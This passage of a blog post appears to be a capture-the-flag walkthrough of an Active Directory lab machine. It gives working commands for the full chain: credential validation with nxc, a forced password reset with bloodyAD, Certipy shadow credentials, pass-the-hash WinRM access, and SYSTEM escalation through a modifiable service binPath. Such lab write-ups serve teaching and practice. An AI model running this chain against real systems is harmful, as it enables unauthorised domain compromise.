+<p>Let&#x27;s see if one of our newly discovered user&#x27;s credentials work as a domain account. Run this in your local terminal aka not SQL:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u c.white -p &#x27;pa$$w0rd72872&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/carol-smb-login.png" alt="Carol smb login" loading="lazy"></figure>
+<p>I do love seeing that green <code>+</code>. It never gets old. <code>c.white</code>&#x27;s account is officially marked validated.</p>
+<p>Let&#x27;s see if <code>k.bennett</code> passes the same test:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u k.bennett -p &#x27;B#8tL!2qPz@6YxM&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/kevin-smb-login.png" alt="Kevin smb login" loading="lazy"></figure>
+<p>2 out of 3 validated accounts. <code>j.sullivan</code> is the last one to try:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u j.sullivan -p &#x27;J$7kP!9vLx#2Qa&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/j-sullivan-smb-login.png" alt="J sullivan smb login" loading="lazy"></figure>
+<p>I&#x27;ll take the 66.7ish% pass rate. 2 out of 3 is great.</p>
+<h2>From Kevin to Lucas</h2>
+<p>Let&#x27;s check <code>k.bennett</code>&#x27;s AD account permissions:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u k.bennett -p &#x27;B#8tL!2qPz@6YxM&#x27; get writable --detail</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/kevin-writable-objects.png" alt="Kevin writable objects" loading="lazy"></figure>
+<p>Not bad. <code>get writable --detail</code> shows <code>k.bennett</code>&#x27;s account plus two DNS zones, but no other user account.</p>
+<p>Let&#x27;s see if Bloodhound shows an Outbound Object Control.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/kevin-outbound-controls.png" alt="Kevin outbound controls" loading="lazy"></figure>
+<p>FINALLY some Outbound Object Controls.</p>
+<p>Let&#x27;s look at the Outbound Object Controls on <code>r.parker</code> first:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/ryan-object-control.png" alt="Ryan object control" loading="lazy"></figure>
+<p><code>k.bennett</code> can reset <code>r.parker</code>’s password, and <code>r.parker</code> has <code>GenericWrite</code> over <code>l.turner</code>, <code>o.scott</code>, and <code>e.walker</code>.</p>
+<p>None of this batch has useful access. No outbounds for <code>l.turner</code> or the other two.</p>
+<p>On to their <code>MemberOf</code> lists.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-memberof-path.png" alt="Lucas memberof path" loading="lazy"></figure>
+<p><code>r.parker</code> is our unsung hero. Kevin (<code>k.bennett</code>) can reset Ryan’s password, Ryan (<code>r.parker</code>) can modify <code>l.turner</code>’s account, and Lucas (<code>l.turner</code>) belongs to <code>Remote Management Users</code> and <code>Print Services Operators</code>.</p>
+<p>We&#x27;ll kick this off by using Kevin&#x27;s <code>ForceChangePassword</code> right to reset Ryan’s password:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u k.bennett -p &#x27;B#8tL!2qPz@6YxM&#x27; set password r.parker &#x27;NorthStoneRparker2026!&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/ryan-password-reset.png" alt="Ryan password reset" loading="lazy"></figure>
+<p>Excellent. Let&#x27;s make sure the new password works:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u r.parker -p &#x27;NorthStoneRparker2026!&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/ryan-password-confirmed.png" alt="Ryan password confirmed" loading="lazy"></figure>
+<p>Success. <code>r.parker</code> can authenticate.</p>
+<p>Let&#x27;s see what attributes Ryan can write on Lucas&#x27;s account:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u r.parker -p &#x27;NorthStoneRparker2026!&#x27; get writable --detail</code></pre>
+<p>Holy long list. This is huge. The first line and last (highlighted) line are the best of the bunch:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-key-credential-permission.png" alt="Lucas key credential permission" loading="lazy"></figure>
+<p>Ryan can write <code>l.turner</code>’s <code>msDS-KeyCredentialLink</code>. Certipy’s <code>shadow auto</code>  can use that right to add a temporary key credential, authenticate as Lucas, and restore the original attribute:</p>
+<pre><code class="language-bash">certipy-ad shadow auto -u &#x27;r.parker@northstone.local&#x27; -p &#x27;NorthStoneRparker2026!&#x27; -account &#x27;l.turner&#x27; -dc-ip 10.1.156.144</code></pre>
+<p>Whoops. We hit an error. Let&#x27;s see what port Certipy is trying to use:</p>
+<pre><code class="language-bash">nc -vz -w 3 10.1.156.144 636</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/shadow-auto-timeout.png" alt="Shadow auto timeout" loading="lazy"></figure>
+<p>Hmm. Port 636 is open, so the timeout doesn&#x27;t have an explanation yet. Let&#x27;s try a read-only Certipy before trying <code>auto</code> again:</p>
+<pre><code class="language-bash">certipy-ad shadow list -u &#x27;r.parker@northstone.local&#x27; -p &#x27;NorthStoneRparker2026!&#x27; -account &#x27;l.turner&#x27; -dc-ip 10.1.156.144 -debug</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/shadow-ldap-debug.png" alt="Shadow ldap debug" loading="lazy"></figure>
+<p>I see what&#x27;s happening here. Certipy times out opening the LDAP connection before hitting Lucas&#x27;s account. I see <code>Target IP: None</code>, and Certipy chose <code>NORTHSTONE.LOCAL</code> as the host.</p>
+<p>Testing with <code>nc</code> reached the DC using the IP address, so we&#x27;ll give Certipy the target IP explicitly in a read-only test:</p>
+<pre><code class="language-bash">certipy-ad shadow list -u &#x27;r.parker@northstone.local&#x27; -p &#x27;NorthStoneRparker2026!&#x27; -account &#x27;l.turner&#x27; -dc-ip 10.1.156.144 -dc-host DC.northstone.local -target DC.northstone.local -target-ip 10.1.156.144 -debug</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/shadow-target-ip-test.png" alt="Shadow target ip test" loading="lazy"></figure>
+<p>Troubleshooting was successful.</p>
+<p>Let&#x27;s run our new and improved original Certipy:</p>
+<pre><code class="language-bash">certipy-ad shadow auto -u &#x27;r.parker@northstone.local&#x27; -p &#x27;NorthStoneRparker2026!&#x27; -account &#x27;l.turner&#x27; -dc-ip 10.1.156.144 -dc-host DC.northstone.local -target DC.northstone.local -target-ip 10.1.156.144</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-shadow-credential.png" alt="Lucas shadow credential" loading="lazy"></figure>
+<p>Certipy added the temporary key credential, obtained a TGT and NT hash for <code>l.turner</code>, then covered tracks by restoring Lucas’s original key credentials.</p>
+<p>Lucas is a member of Remote Management Users. Time to see if his recovered hash allows WinRM on the DC:</p>
+<pre><code class="language-bash">nxc winrm 10.1.156.144 -u l.turner -H &#x27;59c717e891bebfce8cab55d4d50751eb&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-winrm-auth.png" alt="Lucas winrm auth" loading="lazy"></figure>
+<p>Lucas’s hash grants WinRM access on the DC, evidenced by <code>Pwn3d!</code>.</p>
+<p>As Lucas, we&#x27;ll open a shell:</p>
+<pre><code class="language-bash">evil-winrm -i 10.1.156.144 -u l.turner -H &#x27;59c717e891bebfce8cab55d4d50751eb&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-winrm-shell.png" alt="Lucas winrm shell" loading="lazy"></figure>
+<p>We are IN. Let&#x27;s see what groups and Windows privileges he really has:</p>
+<pre><code class="language-powershell">whoami /all</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/lucas-groups.png" alt="Lucas groups" loading="lazy"></figure>
+<p>No backup or admin privileges, but membership in Print Service Operators and Remote Management Users should save the day.</p>
+<h2>PrintNotifyService to SYSTEM</h2>
+<p>Let&#x27;s see if the Print Spooler is running on the DC:</p>
+<pre><code class="language-powershell">Get-Service Spooler</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/print-spooler-running.png" alt="Print spooler running" loading="lazy"></figure>
+<p>Good start. Let&#x27;s see what printers are exposed by the DC:</p>
+<pre><code class="language-powershell">Get-Printer | Select-Object Name,DriverName,PortName,Shared</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/get-printer-denied.png" alt="Get printer denied" loading="lazy"></figure>
+<p>We still might be able to access print service files. We were denied access to <code>Get-Printer</code> aka the command that queries the printer management interface, but not all hope is gone.</p>
+<p>Let&#x27;s check the software related to the printer in <code>C:\Program Files</code>:</p>
+<pre><code class="language-powershell">Get-ChildItem &#x27;C:\Program Files\PrintNotify&#x27; -Force</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-files.png" alt="Printnotify files" loading="lazy"></figure>
+<p>There&#x27;s a printer executable, but we need to know Lucas&#x27;s directory permissions:</p>
+<pre><code class="language-powershell">icacls &#x27;C:\Program Files\PrintNotify&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-directory-acl.png" alt="Printnotify directory acl" loading="lazy"></figure>
+<p>Bingo. <code>NORTHSTONE\Print Services Operators:(OI)(CI)(M)</code> is our golden egg. Lucas is a member, <code>(M)</code> grants modify access to the directory, and <code>(OI)(CI)</code> extends it to files and subdirectories.</p>
+<p>Let&#x27;s see if a service uses <code>print.exe</code>, and if it does, which account runs it:</p>
+<pre><code class="language-powershell">Get-ChildItem &#x27;HKLM:\SYSTEM\CurrentControlSet\Services&#x27; | Get-ItemProperty | Where-Object { $_.ImagePath -match &#x27;PrintNotify|printer\.exe&#x27; } | Select-Object PSChildName,ImagePath,ObjectName,Start</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-service-path.png" alt="Printnotify service path" loading="lazy"></figure>
+<p><code>PrintNotifyService</code> runs <code>printer.exe</code> from this directory as <code>LocalSystem</code>, which Lucas can modify thanks to his group membership.</p>
+<p>I think we found our path to <code>SYSTEM</code>.</p>
+<p>Before I get ahead of myself, let&#x27;s see if Lucas can control the service:</p>
+<pre><code class="language-powershell">sc.exe query PrintNotifyService</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-service-status.png" alt="Printnotify service status" loading="lazy"></figure>
+<p>The service is stopped, and <code>sc.exe query</code> reads the status.</p>
+<p>Let&#x27;s check <code>PrintNotifyService</code>&#x27;s ACL:</p>
+<pre><code class="language-powershell">sc.exe sdshow PrintNotifyService</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-service-permissions.png" alt="Printnotify service permissions" loading="lazy"></figure>
+<p>This is the ACL in SDDL form. To translate this into human, we know Lucas belongs to Print Services Operators. The Print Service Operators group can edit files in the <code>PrintNotify</code> folder, and this permission list says it can change and start the <code>PrintNotifyService</code> service.</p>
+<p>The service happens to run as <code>SYSTEM</code>.</p>
+<p>In summary, Lucas (we) can choose a program for the service to run, start the service, and have that program run as <code>SYSTEM</code>.</p>
+<p>First, we&#x27;ll test this process by having the service write its identity to a TXT file, and if all goes well, we move in:</p>
+<pre><code class="language-powershell">sc.exe qc PrintNotifyService</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-service-config.png" alt="Printnotify service config" loading="lazy"></figure>
+<p>There&#x27;s our path: <code>C:\Program Files\PrintNotify\printer.exe</code>. The service is set to start on demand, running as <code>LocalSystem</code>.</p>
+<p>We&#x27;ll politely ask the service to write the account its running into our TXT file, <code>NorthStonePrintProof.txt</code>.</p>
+<pre><code class="language-powershell">sc.exe config PrintNotifyService binPath= &#x27;C:\Windows\System32\cmd.exe /c whoami &gt; C:\ProgramData\NorthStonePrintProof.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-command-changed.png" alt="Printnotify command changed" loading="lazy"></figure>
+<p>Lucas changed the service command. We move in and start the service:</p>
+<pre><code class="language-powershell">sc.exe start PrintNotifyService</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-start-1053.png" alt="Printnotify start 1053" loading="lazy"></figure>
+<p>We hit a tiny snag. Lucas changed <code>PrintNotifyService</code>’s command successfully, but starting it returned <code>FAILED 1053</code>. <code>NorthStonePrintProof.txt</code> was created, but it&#x27;s 0 bytes in size, so we&#x27;ll try a simpler command.</p>
+<pre><code class="language-powershell">sc.exe config PrintNotifyService binPath= &#x27;C:\Windows\System32\cmd.exe /c echo PRINT_SERVICE_RAN &gt; C:\ProgramData\NorthStonePrintProof.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-marker-command.png" alt="Printnotify marker command" loading="lazy"></figure>
+<p>We&#x27;ve configured the new command. Time to restart the service:</p>
+<pre><code class="language-powershell">sc.exe start PrintNotifyService</code></pre>
+<p>And read our marker file:</p>
+<pre><code class="language-powershell">Get-Content &#x27;C:\ProgramData\NorthStonePrintProof.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/service-command-execution-proof.png" alt="Service command execution proof" loading="lazy"></figure>
+<p>The replacement command ran. Command execution is confirmed.</p>
+<p>Combine this with the <code>LocalSystem</code> service config, and we&#x27;ve confirmed our escalation path, too.</p>
+<p>Let&#x27;s have the service list the Administrator&#x27;s Desktop. We run a command to configuration command first:</p>
+<pre><code class="language-powershell">sc.exe config PrintNotifyService binPath= &#x27;C:\Windows\System32\cmd.exe /c dir /b C:\Users\Administrator\Desktop &gt; C:\ProgramData\NorthStoneAdminDesktop.txt 2&gt;&amp;1&#x27;</code></pre>
+<p>The directory listing command is now configured, and we run (ignore the error/warnings):</p>
+<pre><code class="language-powershell">sc.exe start PrintNotifyService</code></pre>
+<p>And read the output:</p>
+<pre><code class="language-powershell">Get-Content &#x27;C:\ProgramData\NorthStoneAdminDesktop.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/administrator-desktop-listing.png" alt="Administrator desktop listing" loading="lazy"></figure>
+<p>Well, well. What do we have here? Our service run listed <code>root.txt</code> on the Administrator’s Desktop in all its glory.</p>
+<p>Let&#x27;s have the service send us a copy that Lucas can read:</p>
+<pre><code class="language-powershell">sc.exe config PrintNotifyService binPath= &#x27;C:\Windows\System32\cmd.exe /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\ProgramData\NorthStoneRootFlag.txt&#x27;</code></pre>
+<p>Now we start the service, and read our root flag:</p>
+<pre><code class="language-powershell">sc.exe start PrintNotifyService
+Get-Content &#x27;C:\ProgramData\NorthStoneRootFlag.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/root-flag-redacted.png" alt="Domain compromise confirmed" loading="lazy"></figure>
+<p>We should perform one cleanup step, restoring the service&#x27;s original command:</p>
+<pre><code class="language-powershell">sc.exe config PrintNotifyService binPath= &#x27;C:\Program Files\PrintNotify\printer.exe&#x27;
+sc.exe qc PrintNotifyService</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/printnotify-service-restored.png" alt="Printnotify service restored" loading="lazy"></figure>
+<p>And that&#x27;s the end of our long journey to <code>SYSTEM</code>.</p>
+<p>Cue the confetti.</p>
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> &middot;
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
